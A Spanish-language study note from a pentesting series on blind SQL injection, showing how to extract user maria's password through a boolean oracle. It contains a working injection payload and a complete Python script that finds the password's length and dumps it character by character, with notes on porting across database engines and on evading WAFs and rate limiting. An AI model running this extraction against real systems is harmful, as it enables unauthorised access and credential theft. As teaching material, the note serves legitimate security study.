---
tags:
  - Web/Red-Team
  - SQLi
  - Pentesting/Explotacion
Descripción: "Con un oráculo funcional, extraer un dato (la contraseña de maria) es un proceso en dos fases: averiguar su longitud y luego sacar cada carácter preguntando por su valor"
Fecha de actualización: 2026-06-04
Nota previa: "[[03 - Diseño del oráculo booleano]]"
Nota siguiente: "[[05 - Optimización de la extracción]]"
Area: "[[SQLi Blind.base|SQLi Blind]]"
---
---

Con un [[03 - Diseño del oráculo booleano|oráculo]] funcional, extraer un dato (la contraseña de `maria`) es un proceso en dos fases: averiguar su **longitud** y luego sacar **cada carácter** preguntando por su valor. Todo a base de preguntas SÍ/NO.

# Fase 1: la longitud

Sin saber cuántos caracteres tiene el dato, no sabemos cuántas posiciones recorrer. La función `LEN()` (en MySQL, `LENGTH()`) da la longitud; se prueba incrementando hasta acertar:

```python
length = 0
while length < 100 and not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")
```

# Fase 2: carácter a carácter

<mark style="background: #ADCCFFA6;">`SUBSTRING(password, N, 1)` aísla el carácter en la posición `N`</mark> (SQL indexa desde 1, no desde 0). Para compararlo sin usar comillas —que romperían el payload o serían filtradas—, se convierte a su valor decimal con `ASCII()`:

```sql
maria' AND ASCII(SUBSTRING(password,1,1))=57-- -
```

Si el primer carácter es `9` (ASCII 57), la respuesta es `taken` (verdadero). <mark style="background: #FFB8EBA6;">Trabajar con valores ASCII numéricos evita comillas y la comparación de cadenas</mark>, lo que simplifica el payload y esquiva muchos filtros.

> [!info]+
> El rango ASCII es 0-127, pero el `0` es el carácter nulo y los primeros son de control. Limitar la búsqueda a **caracteres imprimibles (32-126)** ahorra peticiones inútiles, ya que las contraseñas y datos textuales caen en ese rango.

# El script completo

```python
import sys

# Fase 1: longitud
length = 0
while length < 100 and not oracle(f"LEN(password)={length}"):
    length += 1
print(f"[*] Password length = {length}")

# Fase 2: volcado carácter a carácter
print("[*] Password = ", end='')
for i in range(1, length + 1):            # posiciones (desde 1)
    for c in range(32, 127):              # ASCII imprimible
        if oracle(f"ASCII(SUBSTRING(password,{i},1))={c}"):
            print(chr(c), end='')
            sys.stdout.flush()
            break
print()
```

> [!info]+
> **Portabilidad a otros motores** (las funciones cambian de dialecto):
> | Función | MSSQL | MySQL | PostgreSQL |
> | ------- | ----- | ----- | ---------- |
> | Longitud | `LEN()` | `LENGTH()` | `LENGTH()` |
> | Subcadena | `SUBSTRING(s,N,1)` | `SUBSTRING(s,N,1)` | `SUBSTRING(s,N,1)` |
> | Carácter→decimal | `ASCII()` | `ASCII()`/`ORD()` | `ASCII()` |
> Adaptar estas tres funciones basta para portar el ataque entre [[00 - Introducción a MSSQL|MSSQL]], [[🐬 MySQL|MySQL]] y PostgreSQL.

# El problema: es lentísimo

Este enfoque lineal pregunta, en el peor caso, por los 95 valores imprimibles de cada carácter. <mark style="background: #FFB86CA6;">Para la contraseña de `maria` son varios miles de peticiones y más de 1.000 segundos</mark> —inviable contra un objetivo real con rate limiting—.

> [!warning]+
> <mark style="background: #FF5582A6;">Lanzar miles de peticiones secuenciales es ruidoso y lento</mark>: cualquier WAF o sistema de detección lo marca, y el rate limiting puede cortarte a mitad del volcado. Reducir el número de peticiones no es solo una cuestión de velocidad, sino de **sigilo y viabilidad**. Ese es el objetivo de la [[05 - Optimización de la extracción|optimización]]: bajar de ~95 a ~7 peticiones por carácter.

La diferencia entre un volcado de 1.000 segundos y uno de 60 está en el algoritmo de búsqueda: [[05 - Optimización de la extracción]].
